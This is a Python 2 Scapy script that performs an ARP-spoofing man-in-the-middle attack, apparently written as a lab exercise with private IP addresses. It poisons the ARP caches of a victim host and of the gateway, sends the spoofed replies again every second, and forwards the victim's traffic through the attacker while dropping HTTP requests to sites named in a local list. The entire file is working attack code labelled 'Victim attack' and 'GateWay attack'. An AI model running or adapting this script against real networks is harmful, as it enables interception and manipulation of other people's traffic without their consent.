from scapy.all import *
import subprocess
import thread
import time

A_IP="192.168.106.128"
V_IP="192.168.106.130"
A_MAC="00:0c:29:1b:6f:10"

def sendarp(arp_reply,gw_reply):
        while(1):
                send(arp_reply)
                send(gw_reply)
                time.sleep(1)

def delete(packet):
        if(packet.haslayer(UDP)):
                del packet[UDP].chksum
                del packet[UDP].len
                del packet.chksum
                del packet.len
                return packet

        elif(packet.haslayer(TCP)):
                del packet[TCP].chksum
                del packet.chksum
                del packet.len
                return packet

        elif(packet.haslayer(ICMP)):
                del packet[ICMP].chksum
                del packet.chksum
                del packet.len
                return packet

        else:
                return packet

def redirect(packet):
        if(packet.haslayer(IP)<=0):
                return
        if(packet.haslayer(TCP)):
                if(str(packet).find('HTTP')>=0):
                        for mal in mal_site_list:
                                if(str(packet).find(mal)>=0):
                                        print "drop" + str(packet)
                                        return
        if(packet[Ether].src== V_MAC):
                print "packet from victim"
                packet[Ether].src=A_MAC
                packet[Ether].dst=GW_A
                packet=delete(packet)
                sendp(packet)

        if(packet[IP].dst==V_IP and packet[Ether].src == GW_A ):
                print "packet from GW"
                packet[Ether].src=A_MAC
                packet[Ether].dst=V_MAC
                packet=delete(packet)
                sendp(packet)

f= open("mal_site.txt",'r')
list=f.read()
mal_site_list=list.split()

# GateWay IP
GW_ALL= subprocess.check_output(["route"])
split_GW=GW_ALL.split()
GW=split_GW[13]


#GateWay Mac
ps=subprocess.Popen(('arp'),stdout=subprocess.PIPE)
output=subprocess.check_output(('grep', GW),stdin=ps.stdout)
ps.wait()
split_GWARP=output.split()
GW_A=split_GWARP[2]
print GW_A

#Victim attack
pkt =sr1(ARP(op=ARP.who_has,psrc =A_IP, pdst=V_IP))
answer= pkt.summary()
split_answer= answer.split()
V_MAC= split_answer[3]

arp_reply = ARP(op=ARP.is_at, psrc=GW, pdst=V_IP, hwsrc = A_MAC, hwdst = V_MAC)
arp_reply.show()
send(arp_reply)

print GW_A

#GateWay attack
gw_reply= ARP(op=ARP.is_at, psrc=V_IP,pdst=GW,hwsrc=A_MAC,hwdst=GW_A)
gw_reply.show()
send(gw_reply)

thread.start_new_thread(sendarp,(arp_reply,gw_reply))

sniff(filter="ip",prn=redirect)

